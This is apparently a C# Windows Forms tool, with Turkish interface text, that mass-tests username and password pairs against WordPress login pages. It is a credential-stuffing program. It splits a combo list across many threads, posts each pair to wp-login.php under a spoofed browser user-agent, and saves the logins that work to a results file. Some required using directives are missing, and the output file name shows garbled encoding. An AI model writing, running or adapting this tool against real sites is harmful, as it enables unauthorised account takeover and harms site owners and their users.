using System.Security.Policy;
using System;
using System.Threading;

namespace WordPress_Login_Checker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        List<Thread> threads = new List<Thread>();
        bool threadStop = false;
        private void loginChecker(List<string> siteList)
        {
            foreach (var siteData in siteList)
            {
                if (threadStop == true)
                    break;

                try
                {
                    string wordpressUrl = siteData.Split('#')[0];
                    string username = siteData.Split('#')[1].Split('@')[0];
                    string password = siteData.Split('#')[1].Split('@')[1];

                    using (HttpClient httpClient = new HttpClient())
                    {
                        httpClient.DefaultRequestHeaders.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");

                        var formContent = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>("log", username),
                            new KeyValuePair<string, string>("pwd", password),
                            new KeyValuePair<string, string>("redirect_to", wordpressUrl.Replace("wp-login.php", "wp-admin")),
                            new KeyValuePair<string, string>("testcookie", "1"),
                        });

                        HttpResponseMessage loginResponse = httpClient.PostAsync(wordpressUrl, formContent).Result;
                        string loginResponseHtml = loginResponse.Content.ReadAsStringAsync().Result;

                        if (loginResponseHtml.Contains("_wpnonce"))
                        {
                            listBox2.Items.Add($"{wordpressUrl}#{username}@{password}");
                            label4.Text = (Convert.ToInt32(label4.Text) + 1).ToString();
                            using (StreamWriter file = File.AppendText("baþarýlý.txt"))
                            {
                                file.WriteLine($"{wordpressUrl}#{username}@{password}");
                            }
                        }

                        else
                        {
                            label6.Text = (Convert.ToInt32(label6.Text) + 1).ToString();
                        }
                    }
                }
                catch
                {
                    label6.Text = (Convert.ToInt32(label6.Text) + 1).ToString();
                }
                progressBar1.Value += 1;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (listBox1.Items.Count == 0)
            {
                MessageBox.Show("Site listesi girmediniz.");
                return;
            }

            List<List<string>> siteList = new List<List<string>>();

            int thread = Math.Min(Convert.ToInt32(numericUpDown1.Value), listBox1.Items.Count);
            int sitesPerThread = listBox1.Items.Count / thread;
            int remainingSites = listBox1.Items.Count % thread;
            int currentIndex = 0;

            for (int i = 0; i < thread; i++)
            {
                List<string> subList = new List<string>();
                int sitesToAdd = sitesPerThread + (i < remainingSites ? 1 : 0);

                for (int j = 0; j < sitesToAdd; j++)
                {
                    subList.Add(listBox1.Items[currentIndex++].ToString());
                }
                siteList.Add(subList);
            }

            foreach (List<string> item in siteList)
            {
                Thread threadd = new Thread(() => loginChecker(item));
                threadd.Start();
                threads.Add(threadd);
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                using (StreamReader reader = new StreamReader(openFileDialog1.FileName))
                {
                    string line;

                    while ((line = reader.ReadLine()) != null)
                    {
                        listBox1.Items.Add(line);
                    }
                }
            }

            label2.Text = listBox1.Items.Count.ToString();
            progressBar1.Maximum = Convert.ToInt32(label2.Text);
            progressBar1.Value = 0;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            threadStop = true;
            foreach (Thread thread in threads)
            {
                thread.Join();
            }
            MessageBox.Show("Program durduruldu.");
        }
    }
}